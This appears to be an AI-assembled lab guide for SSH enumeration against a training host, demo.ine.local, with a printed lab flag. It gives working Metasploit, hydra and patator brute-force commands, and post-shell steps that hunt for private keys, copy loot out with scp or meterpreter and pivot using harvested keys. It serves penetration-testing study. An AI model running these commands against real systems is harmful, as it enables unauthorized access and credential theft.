# SSH Enumeration — merged lab notes and practical guide

This document merges your original notes and demo steps into a single, cohesive SSH enumeration guide. It keeps your demo sequence intact but places it into correct context with additional detail, expected outputs, and safe post-auth actions.

Only test systems you are authorized to test.

---

## Quick SSH primer (what you asked: preserved and expanded)
- What is SSH?
  - SSH (Secure Shell) is a protocol for secure remote login and command execution. It encrypts traffic and is used for interactive shells, file transfer (SFTP/SCP), port forwarding, and tunneling.
- Where is it used?
  - Remote server administration, automation (Ansible), secure file transfers, reverse shells, and tunneling.
- Default port
  - 22/TCP (but may be changed by administrators).

---

## Demo
Target: `demo.ine.local`

This reproduces your lab steps with correct commands, order, and helpful context.

### Step 0 — Prepare Metasploit and workspace

```bash
# Ensure Metasploit DB backend is running (Debian/Ubuntu example)
sudo service postgresql start

# Start Metasploit
msfconsole

# Create / switch to workspace
msf6 > workspace -a ssh_enum
msf6 > workspace ssh_enum

# Optionally set global RHOSTS to save typing
msf6 > setg RHOSTS demo.ine.local
```

### Step 1 — Check reachability 

```bash
ping -c 4 demo.ine.local
```

Expected: replies showing the host is reachable.

### Step 2 — Nmap discovery 

```bash
nmap -sS -sV demo.ine.local
```

Expected: port 22 open and service `ssh` detected. Save the output in case you need to reference it in reports.

### Step 3 — Determine SSH version (msf module)

You used the Metasploit SSH version module — correct.

```text
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(ssh_version) > set RHOSTS demo.ine.local
msf6 auxiliary(ssh_version) > run
```

What it does: connects and fingerprints SSH banner/algorithms. Example output shows protocol version and banner.

### Step 4 — Brute force / credential testing (msf `ssh_login`)

You ran the `ssh_login` module with common user/password lists — correct approach in the lab.

```text
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(ssh_login) > set RHOSTS demo.ine.local
msf6 auxiliary(ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf6 auxiliary(ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(ssh_login) > set VERBOSE true
msf6 auxiliary(ssh_login) > run
```

Expected output: `LOGIN SUCCESS` when a valid user:password pair is found. Metasploit will often record that credential in its database automatically.

Notes: In real engagements, prefer password spraying and low-rate testing to avoid account lockouts.

### Step 5 — If msf opens a session (post-auth interactive)

When `ssh_login` finds valid creds it may spawn a session (shell or meterpreter). You then interact with it:

```text
msf6 > sessions
msf6 > sessions -i 1   # replace 1 with the session ID
# In the remote shell
whoami; id; hostname; uname -a
find / -name "flag" 2>/dev/null
cat /flag
```


Flag: `eb09cc6f1cd72756da145892892fbf5a`

(You listed `sessions`, `sessions -i 1`, `find / -name "flag"`, and `cat /flag` — that sequence is preserved.)

### Alternative enumeration: `ssh_enumusers` (when `ssh_login` fails)

If `ssh_login` does not yield creds, `ssh_enumusers` can attempt to enumerate usernames (where possible). Use `show options` to set RHOSTS and other options.

```text
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(ssh_enumusers) > set RHOSTS demo.ine.local
msf6 auxiliary(ssh_enumusers) > run
```

Limitations: not all SSH servers leak user lists; success depends on server/version/config.

---

## Expanded context and native tooling (extra, helpful commands)

I kept your exact lab commands above. Here are additional commands and tools you may want that fit the same workflows.

### Native recon & fingerprinting

```bash
# Identify host keys quickly
ssh-keyscan demo.ine.local

# Get host key fingerprint
ssh-keyscan -t rsa,ecdsa,ed25519 demo.ine.local | ssh-keygen -lf -

# Audit SSH server algorithms (ssh-audit tool)
ssh-audit demo.ine.local
```

### Alternative credential tools

```bash
# Hydra (fast brute force; be careful)
hydra -L users.txt -P passwords.txt -t 4 ssh://demo.ine.local

# patator (flexible, scriptable)
patator ssh_login host=demo.ine.local user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

---

## Post-auth detailed actions (what to do after you get a shell)

You executed `sessions -i 1` and searched for the flag — that's perfect. Here are expanded, recommended steps to enumerate a newly obtained shell safely.

1. Identify user and environment

```
whoami
id
hostname
uname -a
cat /etc/os-release

# Check home directory and ssh keys
ls -la ~
ls -la ~/.ssh
cat ~/.ssh/authorized_keys
```

2. Quickly hunt for sensitive files (non-destructive)

```bash
# Search common locations for credential files, keys, or flags (limit scope)
find /home -maxdepth 3 -type f \( -name "*id_rsa*" -o -name "*key*" -o -name "*.pem" \) -print 2>/dev/null
find /var/www -maxdepth 3 -type f -name "*.php" -print 2>/dev/null
find / -name "flag" -maxdepth 5 2>/dev/null || true
```

3. Check sudo privileges and scheduled tasks

```
sudo -l            # list sudo rights
crontab -l          # cron jobs for current user
ls -la /etc/cron.*  # system cron jobs
```

4. Harvest and exfiltrate evidence safely

- Use `tar` and `gzip` to package small evidence files.
- Use Metasploit's `download` (meterpreter) or `scp` to securely copy files to your analysis machine.

Example (meterpreter):

```
# inside meterpreter session
download /path/to/file /local/path
```

Example (scp from your attack box using found creds/key):

```bash
scp -i found_id_rsa user@demo.ine.local:/path/to/interesting.file ./loot/
```

---

## Pivoting & lateral movement (brief)

- If you find SSH keys for other hosts, test those keys to pivot: `ssh -i key user@other-host`.
- Use `ssh -A` (agent forwarding) only when authorized and safe; be mindful it can leak keys.
- For network pivoting, tools like `sshuttle` or dynamic SSH tunnels (`ssh -D`) can route traffic through the compromised host.

---

## Safety, evidence & reporting (preserved emphasis)
- Keep a log of all commands you run and outputs (time-stamped).
- Never perform destructive actions unless explicitly authorized.
- Store any sensitive artifacts (flags, dumps) in the `loot/` directory and document their provenance.

---

## References (preserved + useful extras)
- OpenSSH: https://www.openssh.com/
- Metasploit modules (search at Rapid7): https://www.rapid7.com/db/modules/
- ssh-audit: https://github.com/arthepsy/ssh-audit
- Hydra: https://github.com/vanhauser-thc/thc-hydra

---

If you want, I can now:
- Merge this file into a single lab README and commit it.
- Add `tools/ssh-lab-replay.sh` that runs safe checks and saves output to `loot/ssh/demo.ine.local/`.
- Add a short `notes/ssh-usernames.txt` under `notes/`.

Which do you want next?
